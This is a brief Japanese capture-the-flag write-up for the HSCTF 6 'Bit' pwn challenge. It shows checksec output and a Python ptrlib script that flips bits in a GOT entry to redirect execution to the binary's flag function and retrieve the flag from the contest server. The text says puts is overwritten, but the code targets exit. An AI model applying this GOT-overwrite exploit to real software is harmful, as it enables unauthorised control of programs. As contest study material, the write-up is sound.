# [pwn 397pts] Bit - HSCTF 6
64ビットです。
```
$ checksec -f bit
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols     No	0		4	bit
```

メモリ上の4ビットを変更できます。
`flag`関数があるので使われていないputsのGOTアドレスを書き換えます。

```python
from ptrlib import *

elf = ELF("./bit")
#sock = Process("./bit")
sock = Socket("pwn.hsctf.com", 4444)

target = elf.got("exit")
before = 0x080484f6
after = elf.symbol("flag")
gomi = elf.got("setvbuf")

x = 0
for i in range(4):
    a = (before >> (i * 8)) & 0xff
    b = (after >> (i * 8)) & 0xff
    for j in range(8):
        if (a >> j) & 1 != (b >> j) & 1:
            sock.recvuntil("byte: ")
            sock.sendline(hex(target + i)[2:])
            sock.recvuntil("bit: ")
            sock.sendline(str(j))
            sock.recvuntil("byte: ")
            print(sock.recvline())
            x += 1

for i in range(4 - x):
    sock.recvuntil("byte: ")
    sock.sendline(hex(gomi)[2:])
    sock.recvuntil("bit: ")
    sock.sendline("0")
            
sock.interactive()
```

```
$ python solve.py
...
[ð] pwn gods like you deserve this: hsctf{flippin_pwn_g0d}
...
```

# 感想
たまに見るパターン。
